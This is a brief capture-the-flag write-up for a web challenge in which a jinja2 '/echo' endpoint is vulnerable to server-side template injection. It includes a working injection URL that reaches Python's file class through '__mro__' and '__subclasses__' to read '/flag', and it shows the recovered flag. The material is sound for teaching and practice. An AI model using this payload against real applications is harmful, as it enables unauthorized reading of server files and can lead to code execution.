# Stage 5: injector - web - medium

## Challenge

Hack me hard at: http://45.76.80.234:8082/

## Solution

The index page returned a pyc file, but it had errors from some html escapes.
We somehow failed to decompile the file :(

The server itself uses jinja2 at /echo to render the parameter "s" to a page.
This parameter is vulnerable to template injection. The PayloadsAllTheThings
repository already offers nearly ready to use injections here:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2

The following code will print the file at "/flag":

```
http://45.76.80.234:8082/echo?s={{request.args.param.__class__.__mro__[2].__subclasses__()[40](request.args.param).read()}}&param=/flag

You entered: junior-inject_it_like_its_hot

```
